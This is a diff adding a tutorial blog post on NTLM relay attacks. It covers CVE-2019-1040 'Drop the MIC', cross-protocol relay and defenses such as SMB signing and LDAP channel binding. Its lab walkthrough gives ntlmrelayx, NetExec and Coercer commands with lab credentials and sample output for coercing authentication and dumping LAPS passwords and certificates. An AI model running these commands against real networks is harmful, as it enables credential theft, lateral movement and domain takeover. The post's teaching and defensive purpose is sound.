@@ -1,0 +1,345 @@
+---
+layout: post
+title: "NTLM Relay: The Ultimate Man-in-the-Middle Attack"
+date: 2025-08-04 12:00:00 +0000
+categories: [ntlm, relay-attacks, lateral-movement]
+tags: [ntlm-relay, man-in-the-middle, smb, ldap, cross-protocol, authentication]
+description: "Master NTLM relay attacks - from SMB to LDAP cross-protocol authentication abuse and lateral movement techniques"
+---
+
+# NTLM Relay: The Ultimate Man-in-the-Middle Attack
+
+*Intercepting and Relaying Windows Authentication*
+
+---
+
+## 🔐 NTLM Authentication Flow
+
+Before diving into attacks, let's understand the standard NTLM challenge-response mechanism:
+
+<div class="key-concept" markdown="1">
+**Standard NTLM Challenge-Response Process:**
+
+1. **Negotiate:** Client says "I want to authenticate"
+2. **Challenge:** Server responds "Here's a challenge: 4bcde133f44a68ca0"
+3. **Authenticate:** Client replies "I am pixis and here's the encrypted challenge"
+</div>
+
+<div class="warning-box" markdown="1">
+⚠️ **The Critical Flaw:** NTLM doesn't verify WHO is providing the challenge!
+</div>
+
+---
+
+## 🎭 NTLM Relay Attack Concept
+
+The NTLM relay attack exploits this fundamental weakness by positioning an attacker as a man-in-the-middle:
+
+### Attack Flow
+
+| Step | Action | Direction |
+|------|--------|-----------|
+| 1 | **Negotiate** | Client → Attacker |
+| 2 | **Relay Negotiate** | Attacker → Server |
+| 3 | **Challenge** | Server → Attacker |
+| 4 | **Relay Challenge** | Attacker → Client |
+| 5 | **Response** | Client → Attacker |
+| 6 | **Relay Response** | Attacker → Server |
+
+<div class="success-box" markdown="1">
+🎯 **Result:** Attacker can now perform actions on the server with the client's privileges!
+</div>
+
+---
+
+## 📋 NTLM Relay Prerequisites
+
+### Required Conditions
+
+1. **🕸️ MITM Position**
+   - ARP poisoning, LLMNR/NBT-NS, IPv6 attacks, or coercion
+
+2. **🚫 No SMB Signing**
+   - Target must not require SMB message signing
+
+3. **🔓 No Channel Binding**
+   - LDAP/HTTP services without EPA protection
+
+<div class="warning-box" markdown="1">
+⚠️ **Key Limitation:** Cannot relay SMB to LDAP (except with CVE "Drop the MIC")
+</div>
+
+### Protocol Support Matrix
+
+| Relay FROM | Relay TO |
+|------------|----------|
+| ✅ SMB (no signing) | ✅ SMB (no signing) |
+| ✅ HTTP/HTTPS | ✅ LDAP/LDAPS |
+| ✅ MSSQL | ✅ HTTP/HTTPS |
+
+---
+
+## 🌐 Cross-Protocol Relay Magic
+
+The real power of NTLM relay comes from cross-protocol attacks:
+
+<div class="key-concept" markdown="1">
+**The Power of Protocol Independence**
+
+Application layer (HTTP, SMB, SQL) is **independent** from authentication layer (NTLM, Kerberos)
+</div>
+
+### Common Cross-Protocol Scenarios
+
+- **🌐 HTTP → LDAP:** Web authentication → Domain enumeration
+- **📁 SMB → SMB:** File share → Admin share (lateral movement)
+- **🗃️ MSSQL → LDAP:** Database authentication → AD queries
+
+<div class="success-box" markdown="1">
+🎯 **Ultimate Goal:** Turn any NTLM authentication into domain-wide access!
+</div>
+
+---
+
+## 💥 CVE "Drop the MIC" (CVE-2019-1040)
+
+This critical vulnerability changed the NTLM relay landscape:
+
+<div class="vulnerability-alert" markdown="1">
+**CVE-2019-1040: The Game Changer**
+
+- **What it broke:** SMB → LDAP relay protection
+- **How it works:** Removes MIC (Message Integrity Check) from NTLM authentication
+- **Impact:** Enables SMB to LDAP relay attacks
+</div>
+
+### Attack Flow with Drop the MIC
+
+1. **📁 SMB Auth** - Client connects to SMB
+2. **🔧 Remove MIC** - Drop integrity check
+3. **🗄️ LDAP Access** - Full AD enumeration
+
+```bash
+# ntlmrelayx with Drop the MIC
+ntlmrelayx.py -t ldap://dc.domain.com --remove-mic --dump-adcs
+```
+
+<div class="warning-box" markdown="1">
+🚨 **Modern Impact:** Many systems still vulnerable to this 2019 CVE!
+</div>
+
+---
+
+## 🛠️ NTLM Relay Methodology
+
+### 5-Step Attack Process
+
+1. **🔍 Reconnaissance** - Identify targets without SMB signing
+2. **📝 Generate Target List** - Use NetExec --gen-relay-list
+3. **🚀 Launch ntlmrelayx** - Setup relay with target list
+4. **🕸️ Position for MITM** - Responder, ARP poisoning, coercion
+5. **💰 Profit** - Execute commands, dump secrets
+
+### Essential Tools
+
+| Tool | Purpose |
+|------|---------|
+| **ntlmrelayx.py** | Main relay tool |
+| **Responder** | LLMNR/NBT-NS poisoning |
+| **NetExec** | Target identification |
+| **Coercer** | Authentication coercion |
+
+### Attack Options
+
+- `--dump-adcs` - Extract certificates
+- `--dump-laps` - LAPS passwords
+- `-c` - Execute commands
+- `--socks` - SOCKS proxy
+
+---
+
+## 🎯 Lab Demo: Target Discovery
+
+### Step 1: Find Vulnerable Targets
+
+```bash
+# Use NetExec to identify targets without SMB signing
+proxychains nxc smb all_IP --gen-relay-list smb_targets
+```
+
+**Sample Output:**
+```
+SMB  192.168.56.23  445  BRAAVOS     [*] Windows Server 2016 (signing:False)
+SMB  192.168.56.12  445  MEEREEN     [*] Windows Server 2016 (signing:True)
+SMB  192.168.56.22  445  CASTELBLACK [*] Windows 10 (signing:False)
+SMB  192.168.56.10  445  KINGSLANDING [*] Windows 10 (signing:True)
+```
+
+```bash
+# Generate target list file
+cat smb_targets
+192.168.56.23
+192.168.56.22
+```
+
+<div class="success-box" markdown="1">
+✅ **Targets Found:** BRAAVOS and CASTELBLACK have SMB signing disabled!
+</div>
+
+---
+
+## 📁 SMB → SMB Relay Attack
+
+### Classic Lateral Movement
+
+```bash
+# Launch ntlmrelayx targeting SMB hosts
+proxychains ntlmrelayx.py -tf smb_targets -of netntlm -smb2support -socks
+```
+
+**Expected Output:**
+```
+Impacket v0.13.0 - Copyright Fortra, LLC
+
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client SMB loaded..
+
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+```
+
+<div class="warning-box" markdown="1">
+🔥 **Next Step:** Force authentication using Responder or coercion techniques
+</div>
+
+---
+
+## 🎣 Authentication Coercion
+
+### Forcing Target Authentication
+
+```bash
+# Force BRAAVOS to authenticate to our relay
+proxychains coercer coerce -u khal.drogo -d essos.local -p horse -l 192.168.3.22 -t 192.168.56.23
+```
+
+**Coercer Output:**
+```
+      ______
+     / ____/___  ___  _____________  _____
+    / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+   / /___/ /_/ /  __/ /  / /__/  __/ /
+   \____/\____/\___/_/   \___/\___/_/      v2.4.3
+   
+   by @podalirius_
+
+[info] Starting coerce mode
+[info] Scanning target 192.168.56.23
+[+] SMB named pipe '\PIPE\lsarpc' is accessible!
+[+] Successfully bound!
+[+] Sending EfsRpcOpenFileRaw!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+```
+
+---
+
+## 🚀 Advanced Relay Techniques
+
+### HTTP to LDAP Relay
+
+```bash
+# Setup HTTP to LDAP relay
+ntlmrelayx.py -t ldap://dc.domain.com -wh fake-wpad --dump-adcs
+```
+
+### MSSQL to LDAP Relay
+
+```bash
+# Database authentication to AD queries
+ntlmrelayx.py -t ldap://dc.domain.com --dump-laps --dump-adcs
+```
+
+### SOCKS Proxy Mode
+
+```bash
+# Interactive access through relay
+ntlmrelayx.py -tf targets.txt --socks
+```
+
+---
+
+## 🛡️ Defense Strategies
+
+### Primary Defenses
+
+1. **Enable SMB Signing**
+   ```powershell
+   # Require SMB signing on all systems
+   Set-SmbServerConfiguration -RequireSecuritySignature $true
+   ```
+
+2. **LDAP Channel Binding**
+   - Enable LDAP EPA (Extended Protection for Authentication)
+   - Configure channel binding requirements
+
+3. **Network Segmentation**
+   - Limit cross-protocol communication
+   - Monitor authentication flows
+
+### Detection Methods
+
+- Monitor for unusual authentication patterns
+- Watch for cross-protocol NTLM usage
+- Detect authentication coercion attempts
+- Alert on SMB signing mismatches
+
+---
+
+## 🎯 Key Takeaways
+
+<div class="takeaway-box" markdown="1">
+✅ **NTLM relay exploits the protocol's lack of mutual authentication**
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **Cross-protocol attacks are the most dangerous scenarios**
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **SMB signing and LDAP channel binding are critical defenses**
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **Authentication coercion techniques make attacks more practical**
+</div>
+
+---
+
+## 💡 Remember
+
+- NTLM relay attacks remain highly effective in modern environments
+- Cross-protocol capabilities make these attacks particularly dangerous
+- Proper configuration of SMB signing and LDAP protections is essential
+- Regular testing with tools like NetExec helps identify vulnerable systems
+
+<div class="warning-box" markdown="1">
+🚨 **NTLM relay attacks can lead to complete domain compromise in misconfigured environments!**
+</div>
+
+---
+
+*This post is part of the Active Directory attack techniques series. Master these fundamentals to understand modern Windows network security.*
+
+## References
+
+- [Impacket ntlmrelayx Documentation](https://github.com/fortra/impacket)
+- [NetExec Relay Features](https://github.com/Pennyw0rth/NetExec)
+- [CVE-2019-1040 Analysis](https://www.preempt.com/blog/drop-the-mic/)
+- [Coercer Authentication Coercion](https://github.com/p0dalirius/Coercer)
